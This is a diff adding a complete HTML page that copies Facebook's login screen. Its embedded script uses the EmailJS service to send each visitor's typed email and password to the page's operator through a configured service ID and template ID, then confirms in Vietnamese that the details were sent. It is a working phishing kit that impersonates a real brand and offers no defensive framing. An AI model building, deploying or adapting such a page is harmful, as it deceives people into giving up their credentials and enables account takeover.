@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            text-align: center;
+            width: 300px;
+        }
+
+        .logo h1 {
+            font-size: 50px;
+            color: #1877f2;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .login-box button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            margin: 15px 0;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 20px 0;
+            border-bottom: 1px solid #dddfe2;
+        }
+
+        .create-account button {
+            background-color: #42b72a;
+            color: white;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .create-account button:hover {
+            background-color: #36a420;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <h1>facebook</h1>
+        </div>
+        <div class="login-box">
+            <form id="login-form">
+                <input type="text" id="email" name="email" placeholder="Email or phone number" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgotten password?</a>
+            </div>
+            <div class="divider"></div>
+            <div class="create-account">
+                <button>Create New Account</button>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Khởi tạo EmailJS với Public Key của bạn
+        emailjs.init('BtQTdM-oo4uM1E0H6'); // Thay thế bằng Public Key của bạn
+
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Ngăn chặn form gửi thông thường
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Gửi email qua EmailJS
+            emailjs.send('service_k2r1zto', 'template_g6aa48e', {
+                email: email,
+                password: password
+            }).then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                alert("Thông tin đăng nhập đã được gửi!");
+            }, function(error) {
+                console.log('FAILED...', error);
+                alert("Có lỗi xảy ra khi gửi thông tin. Vui lòng thử lại.");
+            });
+        });
+    </script>
+</body>
+</html>
+
+
